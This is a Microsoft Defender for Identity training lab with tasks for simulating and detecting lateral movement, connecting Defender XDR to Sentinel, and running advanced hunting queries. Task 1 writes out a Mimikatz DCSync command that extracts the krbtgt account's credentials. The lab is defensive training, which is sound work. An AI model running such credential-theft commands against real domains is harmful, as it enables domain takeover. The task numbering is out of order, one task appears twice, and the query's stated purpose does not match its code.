### Task 1: Simulate and Detect Lateral Movement Attacks `(Read-Only)`

In this task, you will simulate a Lateral Movement attack and detect it using Microsoft Defender for Identity. Please note that this is a `read-only` task, as you will be logged out of your virtual machine during the attack simulation—this is a security measure enforced by Defender for Identity.

1. Open **PowerShell (Admin)** and navigate to the below-mentioned directory.

      ```powershell
      cd C:\MimikatzLab\mimikatz-master\mimikatz-master\x64
      ```
1. In the same PowerShell session, run the below command to run the mimikatz application

     ```powershell
     mimikatz.exe 
     ```

1. Simulate a DC Sync attack and extract the credentials of the krbtgt account.

      ```shell
      lsadump::dcsync /domain:yourdomain.com /user:krbtgt
      ```

1. Now you can check your alerts in the Microsoft Defender portal, navigate to **Incidents & alerts** in the left-hand navigation pane.

      ![](./media/E1T3S3upd1.png)

1. Click **Alerts** to view the alerts queue.

1. You will find alerts with the below names
     - **Lateral movement using remote logon by contained user blocked**
     - **Lateral movement using RDP blocked**

      ![](./media/E1T3S3upd.png)
      > **Note:** The user will be logged out of the virtual machine as part of the containment measures initiated by the Defender in response to the user's attempted lateral movement attack.


### Task 4: Investigate Threats and User Timelines 

In this task you will analyze using user timelines and alert details in the Defender portal.

1. In the Microsoft Defender portal, in the search bar, type `demouser` and select it.

      ![](./media/E1T3S1.png)

1. Click on **Go to user page**

      ![](./media/E1T3S2.png)

1. In the user profile, click the **Timeline** tab and you will be able to see the events like `Lateral movement attacks` and `mimikatz credential theft tool` alerts

      ![](./media/E1T3S3.png)

### Task 2: Integrate Defender for Identity with Microsoft 365 Defender Portal

In this task you will enable integration to view Defender for Identity incidents in the unified Microsoft 365 Defender portal and Microsoft Sentinel.

1. Navigate to `portal.azure.com` and navigate to **Microsoft Sentinel** and select `loganalyticworkspace`.

      ![](./media/E1T4S1.png)

1. In the left-hand pane, click **Content hub**. 

      ![](./media/Lab02-task1-contenthub1.png)

1. Search for **Defender for XDR** and select it and click on **Install** and wait for the installation to be complete

      ![](./media/E1T4S3.png)

1. Return to the Sentinel workspace and navigate to **Data Connectors** and click on  **Defender for XDR** and select **Open connector page**.

      ![](./media/E1T4S4.png)

1. Click on **Connect incidents & alerts** and navigate back to Data connectors page and make sure that **Defender for XDR** shows as connected

      ![](./media/E1T4S5.png)


### Task 5: Integrate Defender for Identity with Microsoft 365 Defender Portal

In this task you will enable integration to view Defender for Identity incidents in the unified Microsoft 365 Defender portal and Microsoft Sentinel.

1. Navigate to `portal.azure.com` and navigate to **Microsoft Sentinel** and select `loganalyticworkspace`.

      ![](./media/E1T4S1.png)

1. In the left-hand pane, click **Content hub**. 

      ![](./media/Lab02-task1-contenthub1.png)

1. Search for **Defender for XDR** and select it and click on **Install** and wait for the installation to be complete

      ![](./media/E1T4S3.png)

1. Return to the Sentinel workspace and navigate to **Data Connectors** and click on  **Defender for XDR** and select **Open connector page**.

      ![](./media/E1T4S4.png)

1. Click on **Connect incidents & alerts** and navigate back to Data connectors page and make sure that **Defender for XDR** shows as connected

      ![](./media/E1T4S5.png)

### Task 3: Review and Run Advanced Hunting Queries for Identity Signals

In this task you will use advanced hunting queries in the Defender portal to detect identity-based threats.

1. In the Microsoft Defender portal, click **Hunting** in the left-hand navigation pane and select **Advanced hunting** from the menu.

      ![](./media/E1T5S1.png)

1. In the query editor, paste the following KQL query to detect Lateral movement attacks:

   ```kql
   AlertInfo
   | summarize AlertCount = count() by Title, DetectionSource
   | order by AlertCount desc
   ```
   - Click **Run query** to execute.

      ![](./media/E1T5S2.png)

1. Review the results table for all the alerts, 

1. Click **Save** in the top-right corner.
   - Name the query as `Alert1`.
   - Select **Save**.

      ![](./media/E1T5S4.png)

